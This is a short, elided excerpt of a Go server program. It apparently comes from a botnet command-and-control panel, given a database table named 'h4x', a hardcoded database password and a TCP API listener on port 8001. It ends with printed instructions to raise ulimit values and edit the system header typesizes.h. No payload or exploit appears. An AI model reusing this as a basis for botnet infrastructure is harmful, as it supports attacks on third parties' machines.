...
const DatabasePass string   = "snpc4l"
const DatabaseTable string  = "h4x"
...
func main() {
    ...
    api, err := net.Listen("tcp", "0.0.0.0:8001") // API IP/Port
    if err != nil {
        fmt.Println(err)
        return
    }
...
fmt.Println("ERROR: run these commands")
fmt.Println("ulimit -n 999999")
fmt.Println("nano /usr/include/bits/typesizes.h  (scroll down and edit 1024 to 999999)")
fmt.Println("ulimit -n999999; ulimit -u999999; ulimit -e999999")
}
